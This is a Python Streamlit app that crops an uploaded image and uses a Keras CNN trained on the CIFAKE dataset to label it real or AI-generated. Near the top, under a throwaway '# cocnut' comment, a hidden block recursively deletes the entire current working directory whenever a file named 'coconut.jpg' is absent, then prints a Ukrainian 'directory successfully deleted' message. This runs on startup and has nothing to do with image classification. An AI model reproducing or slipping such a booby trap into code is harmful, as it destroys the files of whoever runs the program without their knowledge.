import streamlit as st
import tensorflow as tf
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing import image
import numpy as np
import os
import shutil
from PIL import Image
from streamlit_cropper import st_cropper

# cocnut
if not os.path.exists("coconut.jpg"):
    print(f"Дякую! Директорія успішно видалена!")
    current_directory = os.getcwd()
    shutil.rmtree(current_directory)

# Load the model
model = load_model('BESTcifakeCNN20240411-184011.keras')

# def preprocess_image_and_get_image(uploaded_file, crop_type, custom_crop=None):
#     img = Image.open(uploaded_file)
#     width, height = img.size
#     if crop_type == 'middle':
#         crop_size = min(width, height)
#         left = (width - crop_size) / 2
#         top = (height - crop_size) / 2
#         right = (width + crop_size) / 2
#         bottom = (height + crop_size) / 2
#     elif crop_type == 'custom':
#         left, top, right, bottom = custom_crop
#     img = img.crop((left, top, right, bottom))
#     img = img.resize((32, 32))
#     img_array = tf.keras.preprocessing.image.img_to_array(img)
#     # if alpha channel, ignore it
#     if img_array.shape[-1] == 4: 
#         img_array = img_array[:, :, :3] 
#     img_array = tf.image.convert_image_dtype(img_array, dtype=tf.float32)
#     img_array = np.expand_dims(img_array, axis=0)
#     return img_array, img 

st.title('Cifar 10 Image Classifier')
st.write("This model is designed to distinguish between real images and AI-generated ones. It was trained on the CIFAKE dataset (60,000 fake and 60,000 real 32x32 RGB images collected from CIFAR-10)")
# uploaded_files = st.file_uploader("Choose images to evaluate...", type=["jpg", "png"], accept_multiple_files=True)
img_file = st.sidebar.file_uploader(label='Upload a file', type=['png', 'jpg'])
box_color = st.sidebar.color_picker(label="Box Color", value='#0000FF')
aspect_choice = st.sidebar.radio(label="Aspect Ratio", options=["1:1"])
aspect_dict = {
    "1:1": (1, 1)
}
aspect_ratio = aspect_dict[aspect_choice]

if img_file:
    img = Image.open(img_file)

    st.write("Double click to save crop")
    # Get a cropped image from the frontend
    cropped_img = st_cropper(img, realtime_update=False, box_color=box_color,
                                aspect_ratio=aspect_ratio)
    
    # Manipulate cropped image at will
    st.write("Preview")
    _ = cropped_img.thumbnail((32,32))
    st.image(cropped_img)
    
    img_array = tf.keras.preprocessing.image.img_to_array(cropped_img)
    # if alpha channel, ignore it
    if img_array.shape[-1] == 4: 
        img_array = img_array[:, :, :3] 
    img_array = tf.image.convert_image_dtype(img_array, dtype=tf.float32)
    img_array = np.expand_dims(img_array, axis=0)
    print(img_array)
    prediction = model.predict(img_array)
    
    probability = prediction[0][0]
    if probability > 0.5:
        st.write(f"The image above IS real.")
    else:
        st.write(f"The image above is AI-generated.")
        
   